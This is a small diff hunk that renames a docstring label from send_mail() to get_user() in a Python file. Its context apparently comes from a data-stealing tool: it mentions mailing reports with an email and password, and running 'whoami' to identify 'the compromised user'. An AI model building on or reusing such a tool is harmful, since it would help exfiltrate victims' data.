@@ -155,7 +155,7 @@ def send_mail(email, password, report, report_email):
     server.quit()
 
 """ 
-* Function Name:  send_mail()
+* Function Name:  get_user()
 * Input:          None
 * Output:         user (string): The compromised user. 
 * Logic:          The function runs the 'whoami' subprocess call to retrieve the username of the compromised user. 
